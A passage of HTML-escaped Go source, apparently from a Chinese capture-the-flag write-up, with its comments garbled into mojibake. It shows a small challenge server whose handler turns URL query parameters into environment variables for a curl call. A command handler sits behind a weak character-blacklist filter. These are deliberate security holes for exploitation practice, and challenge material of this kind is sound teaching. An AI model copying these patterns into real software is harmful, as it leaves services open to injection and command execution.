&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">command&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Stdout&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>&lt;span style="color:#75af00">outinfo&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">command&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Stderr&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>&lt;span style="color:#75af00">outerr&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">command&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Start&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">res&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#d88200">&amp;#34;ERROR&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">nil&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fmt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Println&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Error&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#75af00">command&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Wait&lt;/span>&lt;span style="color:#111">();&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">nil&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">res&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#75af00">outerr&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">String&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">res&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#75af00">outinfo&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">String&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fmt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Fprintf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">w&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">waf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">c&lt;/span> &lt;span style="color:#00a8c8">string&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">bool&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">t&lt;/span> &lt;span style="color:#00a8c8">int32&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">t&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">blacklist&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#00a8c8">string&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#34;.&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;*&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;?&amp;#34;&lt;/span>&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#75715e">// é»‘åå•
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#75af00">_&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">s&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#00a8c8">range&lt;/span> &lt;span style="color:#75af00">c&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#75af00">_&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">b&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#00a8c8">range&lt;/span> &lt;span style="color:#75af00">blacklist&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">b&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">string&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">s&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">unicode&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">IsLetter&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">s&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75715e">// æ˜¯å¦ä¸ºå­—æ¯
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">t&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#75af00">s&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">continue&lt;/span> &lt;span style="color:#75715e">// å¦‚æœä¸‹ä¸€ä¸ªå­—ç¬¦ascii==ä¸Šä¸€ä¸ªå­—ç¬¦ åˆ™ç»§ç»­
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">t&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">t&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#75af00">s&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">file&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">os&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;secret/key&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">nil&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">panic&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">defer&lt;/span> &lt;span style="color:#75af00">file&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Close&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">content&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">ioutil&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">ReadAll&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">file&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">SecretKey&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#111">string&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">content&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">HandleFunc&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">getToken&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">HandleFunc&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/manage&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">manage&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;start listen 9091&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">ListenAndServe&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;:9091&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">nil&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e">// ç›‘å¬ç«¯å£ 9091
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">nil&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Fatal&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;ListenAndServe: &amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>webæœåŠ¡ï¼Œå¯¹å¤–è®¿é—®&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-go" data-lang="go">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#75af00">main&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;bytes&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;crypto/md5&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;encoding/json&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;fmt&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;io&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;io/ioutil&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;log&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;math/rand&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;net/http&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;os&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;os/exec&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;path/filepath&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;strings&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">SecretKey&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">type&lt;/span> &lt;span style="color:#75af00">TokenResult&lt;/span> &lt;span style="color:#00a8c8">struct&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">Success&lt;/span> &lt;span style="color:#00a8c8">string&lt;/span> &lt;span style="color:#75af00">json&lt;/span>&lt;span style="color:#111">:&lt;/span>&lt;span style="color:#d88200">&amp;#34;success&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">Failed&lt;/span> &lt;span style="color:#00a8c8">string&lt;/span> &lt;span style="color:#75af00">json&lt;/span>&lt;span style="color:#111">:&lt;/span>&lt;span style="color:#d88200">&amp;#34;failed&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">letterBytes&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">RandStringBytes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">n&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">string&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">b&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#111">make&lt;/span>&lt;span style="color:#111">([]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">n&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#00a8c8">range&lt;/span> &lt;span style="color:#75af00">b&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">b&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#75af00">letterBytes&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Intn&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">letterBytes&lt;/span>&lt;span style="color:#111">))]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">string&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">b&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">getToken&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">w&lt;/span> &lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">ResponseWriter&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">r&lt;/span> &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Request&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">values&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">r&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">URL&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Query&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fromHostList&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">strings&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Split&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">r&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">RemoteAddr&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;:&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e">// è·å–æ¥æºip
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">fromHost&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">fromHostList&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fromHost&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#75af00">fromHostList&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">r&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Header&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Set&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Fromhost&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">fromHost&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">command&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">exec&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Command&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;curl&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;-H&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;Fromhost: &amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#75af00">fromHost&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;127.0.0.1:9091&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e">// æœ¬åœ°curlè®¿é—®9091
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#75af00">k&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">_&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#00a8c8">range&lt;/span> &lt;span style="color:#75af00">values&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">command&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Env&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">command&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Env&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">fmt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Sprintf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;%s=%s&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">k&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">values&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">k&lt;/span>&lt;span style="color:#111">)))&lt;/span> &lt;span style="color:#75715e">//è·å–ç¯å¢ƒå˜é‡ å°†å‚æ•°é”®å€¼å¯¹å½¢å¼è®¾ä¸ºç¯å¢ƒå˜é‡
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">outinfo&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">bytes&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Buffer&lt;/span>&lt;span style="color:#111">{}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">outerr&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">bytes&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Buffer&lt;/span>&lt;span style="color:#111">{}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">command&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Stdout&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>&lt;span style="color:#75af00">outinfo&lt;/span>
